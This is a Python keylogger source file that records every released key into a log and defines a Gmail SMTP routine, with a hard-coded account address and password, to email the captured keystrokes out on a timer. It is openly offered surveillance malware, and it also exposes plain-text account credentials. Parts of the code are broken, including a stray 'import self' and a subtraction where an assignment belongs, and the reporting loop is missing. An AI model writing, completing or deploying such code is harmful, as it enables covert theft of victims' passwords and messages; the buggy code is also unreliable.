import keyboard
import smtplib  # for sending email using SMTP protocol (gmail)
from threading import Timer
from datetime import datetime

# initializing parameters
import self as self

SEND_REPORT_EVERY = 60  # seconds
EMAIL_ADDRESS = "pythonkeylogger@gmail.com"
EMAIL_PASSWORD = "C4uhUmEZVG8ikx4"


class KeyLogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval  # time between every report, defined by SEND_REPORT_EVERY
        self.report_method = report_method
        self.log = ""  # keystrokes stored here

        # record start and end dates
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """"
        Is called whenver a keyboard event occurs ie.
        A key is released
        """
        name - event.name
        if len(name) > 1:  # if special key
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"  # add newline
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"  # formatted string literals

        self.log += name  # add to total log

    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)  # manages connection to SMTP server
        server.starttls()  # connect to the SMTP server as TLS mode (for security)
        server.login(email, password)  # login to email
        server.sendmail(email, email, message)  # send the message
        server.quit()  # end the session


